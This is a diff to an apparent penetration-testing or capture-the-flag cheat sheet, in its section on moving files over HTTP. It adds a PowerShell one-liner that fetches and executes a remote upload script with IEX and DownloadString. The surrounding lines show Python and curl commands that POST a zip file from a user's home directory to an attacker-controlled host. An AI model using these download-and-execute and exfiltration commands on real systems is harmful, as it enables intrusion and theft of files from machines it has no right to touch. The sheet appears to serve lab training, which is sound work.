@@ -724,7 +724,12 @@ bin
 ascii
 ```
 # HTTP
+https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
 ```bash
+#powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37:8000/PSUpload.ps1');Invoke-FileUpload -Uri http://10.10.14.37:8000/upload -File 
+
+# linux
 python3 -c "import requests;requests.post(\"http://10.10.14.68:8000/upload\",files={\"files\":open(\"/home/lnorgaard/RT30000.zip\",\"rb\")})"
 curl -X POST http://10.10.14.68:8000/upload -F 'files=@/home/lnorgaard/RT30000.zip'
 ```
